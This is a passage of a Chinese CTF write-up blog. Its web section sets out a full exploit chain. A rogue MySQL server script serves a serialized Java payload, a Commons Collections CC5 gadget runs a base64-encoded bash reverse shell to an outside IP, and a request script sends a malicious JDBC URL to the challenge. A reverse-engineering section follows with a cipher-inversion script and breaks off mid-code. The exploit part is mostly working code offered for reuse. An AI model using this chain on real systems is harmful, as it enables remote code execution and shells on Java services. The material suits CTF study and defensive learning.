672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></div><p>运行这个脚本开启监听,然后使用cc5的链子弹shell</p><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEwNS41NS4xMTEvNzg4NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(exp, entry);</span><br><span class="line">        serialize(exp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>写一个脚本发送请求,浏览器可能会混淆,所以发包成功了</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = <span class="string">&quot;http://019a8260-e362-7f93-a3c0-476710b9765e.geek.ctfplus.cn/connect&quot;</span></span><br><span class="line"></span><br><span class="line">jdbc_url = <span class="string">&quot;jdbc:mysql://47.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: jdbc_url,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 正在发送请求...&quot;</span>)</span><br><span class="line">resp = requests.get(base, params=params, timeout=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 返回状态：&quot;</span>, resp.status_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 返回内容：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure></div><p>运行脚本发包,在恶意mysql监听可以看到收到的mysql握手包和我们发过去的payload</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121201813591.png"></p><p>成功弹到shell,并在根目录拿到flag</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121201820736.png"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>所有的re的部分都是另外一个队友做的了，太强了orz，他的博客：<a class="link" target="_blank" rel="noopener" href="https://gypsophilazj.github.io/">啥都不会捏<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><h3 id="re-stack-bomb"><a href="#re-stack-bomb" class="headerlink" title="re-stack_bomb"></a>re-stack_bomb</h3><p>开始通过查看字符串找到主main函数</p><p>这题用f5是反编译不出主要的函数的</p><p>因为这个程序是通过修改eax的值，用call eax来实现跳转</p><p>将主main函数的汇编代码丢给ai分析</p><p>找到程序的主要逻辑是在这里</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251103210753392.png"></p><p>通过动调，在每一个call eax中f7</p><p>找到sub_E51920</p><p>通过动态调试分析逻辑发现这就是最主要的数据加密处理函数v71和v70都是我们输入的数据，以dword的形式来传入，接着在动调中的汇编代码查看每一个stack中所对应的数据或者所对应的地址，对每一步的操作进行解析</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251103210959304.png"></p><p>把所有的数据收集起来，最后让ai编写解密脚本</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">MASK = <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">x</span>): <span class="keyword">return</span> x &amp; MASK</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add32</span>(<span class="params">a, b</span>): <span class="keyword">return</span> (a + b) &amp; MASK</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub32</span>(<span class="params">a, b</span>): <span class="keyword">return</span> (a - b) &amp; MASK</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl32</span>(<span class="params">x, n</span>): <span class="keyword">return</span> ((x &amp; MASK) &lt;&lt; (n &amp; <span class="number">31</span>)) &amp; MASK</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr32</span>(<span class="params">x, n</span>): <span class="keyword">return</span> (x &amp; MASK) &gt;&gt; (n &amp; <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F_of_R</span>(<span class="params">R, v, K0, K1, C1, C2</span>):</span><br><span class="line">    <span class="comment"># t1 = K0 + (R &lt;&lt; C1)</span></span><br><span class="line">    <span class="comment"># t2 = K1 + (R &gt;&gt;&gt; C2)</span></span><br><span class="line">    <span class="comment"># F = (v + R) ^ t1 ^ t2</span></span><br><span class="line">    t1 = add32(K0, shl32(R, C1))</span><br><span class="line">    t2 = add32(K1, shr32(R, C2))</span><br><span class="line">    <span class="keyword">return</span> (add32(v, R) ^ t1 ^ t2) &amp; MASK</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">G_of_L</span>(<span class="params">L, v, K2, K3, C1, C2</span>):</span><br><span class="line">    <span class="comment"># t3 = K2 + (L &lt;&lt; C1)</span></span><br><span class="line">    <span class="comment"># t4 = K3 + (L &gt;&gt;&gt; C2)</span></span><br><span class="line">    <span class="comment"># G = (v + L) ^ t3 ^ t4</span></span><br><span class="line">    t3 = add32(K2, shl32(L, C1))</span><br><span class="line">    t4 = add32(K3, shr32(L, C2))</span><br><span class="line">    <span class="keyword">return</span> (add32(v, L) ^ t3 ^ t4) &amp; MASK</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_one_call</span>(<span class="params">L_out, R_out, K, C1, C2, glob, rounds</span>):</span><br><span class="line">    K0, K1, K2, K3 = K</span><br><span class="line">    L, R = u32(L_out), u32(R_out)</span><br><span class="line">    <span class="comment"># 倒序逐轮还原：第 i 轮使用 v = i * glob</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        v = u32(i * u32(glob))</span><br><span class="line">        <span class="comment"># 逆第二步：R_prev = R - G(L, v)</span></span><br><span class="line">        g = G_of_L(L, v, K2, K3, C1, C2)</span><br><span class="line">        R = sub32(R, g)</span><br><span class="line">        <span class="comment"># 逆第一步：L_prev = L - F(R_prev, v)</span></span><br><span class="line">        f = F_of_R(R, v, K0, K1, C1, C2)</span><br><span class="line">        L = sub32(L, f)</span><br><span class="line">    <span class="keyword">return</span> u32(L), u32(R)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_pipeline</span>(<span class="params">LR_out, calls</span>):</span><br><span class="line">    L, R = u32(LR_out[<span class="number">0</span>]), u32(LR_out[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 逆过程：按相反顺序应用每次调用的逆</span></span><br><span class="line">    <span class="keyword">for</span> call <span class="keyword">in</span> <span class="built_in">reversed</span>(calls):</span><br><span class="line">        L, R = invert_one_call(</span><br><span class="line">            L, R,</span><br><span class="line">            K=call[<span class="string">&quot;K&quot;</span>],</span><br><span class="line">            C1=call[<span class="string">&quot;C1&quot;</span>], C2=call[<span class="string">&quot;C2&quot;</span>],</span><br><span class="line">            glob=call[<span class="string">&quot;glob&quot;</span>], rounds=call[<span class="string">&quot;rounds&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> u32(L), u32(R)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32_to_le_bytes</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(x &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFF</span>, (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 题目里的 4 个目标块（小端的两个 u32）</span></span><br><span class="line">    target_blocks = [</span><br><span class="line">        (<span class="number">0x9A8C0C4B</span>, <span class="number">0xC412FF1C</span>),</span><br><span class="line">        (<span class="number">0xBFC3A488</span>, <span class="number">0xB16C8FD0</span>),</span><br><span class="line">        (<span class="number">0x4136E319</span>, <span class="number">0x8835E4FF</span>),</span><br><span class="line">        (<span class="number">0x118263A7</span>, <span class="number">0x7C85D629</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 你给的固定参数</span></span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    glob   = <span class="number">0x09000000</span></span><br><span class="line">    K      = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">    C1, C2 = <span class="number">4</span>, <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个块的调用序列（按执行顺序；这里每块只调用一次且参数相同）</span></span><br><span class="line">    calls = [[&#123;<span class="string">&quot;K&quot;</span>: K, <span class="string">&quot;C1&quot;</span>: C1, <span class="string">&quot;C2&quot;</span>: C2, <span class="string">&quot;glob&quot;</span>: glob, <span class="string">&quot;rounds&quot;</span>: rounds&#125;]] * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐块逆向</span></span><br><span class="line">    words = []</span><br><span class="line">    <span class="keyword">for</span> blk_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        L0, R0 = invert_pipeline(target_blocks[blk_idx], calls[blk_idx])</span><br><span class="line">        words.extend([L0, R0])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拼出 32 字节明文（按 Buffer 的顺序：Block0..Block3，每块 L 再 R，皆小端）</span></span><br><span class="line">    pt = <span class="string">b&quot;&quot;</span>.join(u32_to_le_bytes(w) <span class="keyword">for</span> w <span class="keyword">in</span> words)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;plaintext hex:&quot;</span>, pt.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext ascii:&quot;</span>, pt.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ascii decode failed; raw bytes printed above.&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="re-reReverse"><a href="#re-reReverse" class="headerlink" title="re-reReverse"></a>re-reReverse</h3><p>做了好几天了</p><p>通过ai分析出了xxtea</p><p>但一直解不出来</p><p>尝试动态调试但无法调成功，进不到加密的函数中</p><p>把爆红的代码和题目描述给ai分析发现</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106203720671.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106203756303.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106203427711.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106203444868.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106203509021.png"></p><p>让ai帮我生成一个trace脚本来dump汇编代码的正确执行顺序</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 